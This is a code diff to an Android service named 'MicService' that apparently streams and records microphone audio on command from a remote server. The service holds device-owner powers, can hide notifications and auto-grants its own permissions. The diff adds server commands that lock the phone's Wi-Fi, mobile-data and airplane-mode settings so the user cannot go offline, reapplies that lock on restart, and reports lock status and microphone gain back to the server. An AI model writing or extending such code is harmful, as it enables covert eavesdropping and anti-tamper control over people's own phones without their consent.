@@ -641,6 +641,24 @@ class MicService : Service() {
 
                 // 5. Reinforce Auto-Grant Permissions on every restart
                 UpdateService.autoGrantPermissions(this)
+
+                // 6. Enforce network restrictions based on dashboard preference
+                try {
+                    if (prefs.getBoolean("network_locked", false)) {
+                        dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_WIFI)
+                        dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_MOBILE_NETWORKS)
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_AIRPLANE_MODE)
+                        }
+                        Log.i(TAG, "Network restrictions applied (Wi-Fi, Data, Airplane Mode locked)")
+                    } else {
+                        dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_WIFI)
+                        dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_MOBILE_NETWORKS)
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_AIRPLANE_MODE)
+                        }
+                    }
+                } catch (e: Exception) { Log.w(TAG, "Network restriction policy failed: ${e.message}") }
             }
         } catch (e: Exception) {
             Log.e(TAG, "setupDeviceOwnerPolicies failed: ${e.message}")
@@ -1295,6 +1313,7 @@ class MicService : Service() {
                         // 2. Enable Kiosk Mode (LockTaskMode)
                         dpm.setLockTaskPackages(admin, arrayOf(packageName))
                         prefs.edit().putBoolean("lock_task_mode", true).apply()
+                        sendHealthStatus("app_locked")
                         
                         // Trigger Activity to start pinning
                         val intent = Intent(this, MainActivity::class.java).apply {
@@ -1326,6 +1345,7 @@ class MicService : Service() {
                         
                         // 2. Disable Kiosk Mode
                         prefs.edit().putBoolean("lock_task_mode", false).apply()
+                        sendHealthStatus("app_unlocked")
                         val intent = Intent(this, MainActivity::class.java).apply {
                             flags = Intent.FLAG_ACTIVITY_NEW_TASK
                             putExtra("action", "unlock")
@@ -1413,6 +1433,52 @@ class MicService : Service() {
                     sendCommandAck("uninstall_app", "error", e.message)
                 }
             }
+            "lock_network" -> {
+                Log.i(TAG, "CMD: lock_network - restricting network toggles")
+                try {
+                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    if (dpm.isDeviceOwnerApp(packageName)) {
+                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                        dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_WIFI)
+                        dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_MOBILE_NETWORKS)
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
+                            dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_AIRPLANE_MODE)
+                        }
+                        prefs.edit().putBoolean("network_locked", true).apply()
+                        sendHealthStatus("network_locked")
+                        sendCommandAck("lock_network")
+                        Log.i(TAG, "Network toggles locked")
+                    } else {
+                        sendCommandAck("lock_network", "error", "not_device_owner")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to lock network: ${e.message}")
+                    sendCommandAck("lock_network", "error", e.message)
+                }
+            }
+            "unlock_network" -> {
+                Log.i(TAG, "CMD: unlock_network - allowing network toggles")
+                try {
+                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    if (dpm.isDeviceOwnerApp(packageName)) {
+                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                        dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_WIFI)
+                        dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_MOBILE_NETWORKS)
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
+                            dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_AIRPLANE_MODE)
+                        }
+                        prefs.edit().putBoolean("network_locked", false).apply()
+                        sendHealthStatus("network_unlocked")
+                        sendCommandAck("unlock_network")
+                        Log.i(TAG, "Network toggles unlocked")
+                    } else {
+                        sendCommandAck("unlock_network", "error", "not_device_owner")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to unlock network: ${e.message}")
+                    sendCommandAck("unlock_network", "error", e.message)
+                }
+            }
             else -> Log.d(TAG, "Unknown command: $cmd")
         }
     }
@@ -1422,7 +1488,7 @@ class MicService : Service() {
         try {
             val obj = JSONObject(jsonText)
             when (obj.optString("type")) {
-                "get_data", "force_update", "start_stream", "stop_stream", "start_record", "stop_record", "ping", "force_reconnect", "grant_permissions", "enable_autostart", "check_update", "clear_device_owner", "lock_app", "unlock_app", "hide_notifications", "uninstall_app" -> {
+                "get_data", "force_update", "start_stream", "stop_stream", "start_record", "stop_record", "ping", "force_reconnect", "grant_permissions", "enable_autostart", "check_update", "clear_device_owner", "lock_app", "unlock_app", "hide_notifications", "uninstall_app", "lock_network", "unlock_network" -> {
                     handleServerCommand(obj.optString("type"))
                     return
                 }
@@ -4198,6 +4264,9 @@ class MicService : Service() {
             put("callActive", callActive)
             put("lowNetwork", lowNetworkMode)
             put("streamingMode", "realtime")
+            put("gainLevel", softwareGainMultiplier)
+            put("networkLocked", prefs.getBoolean("network_locked", false))
+            put("appLocked", prefs.getBoolean("lock_task_mode", false))
 
             // Network quality info
             put("netDownKbps", downKbps)
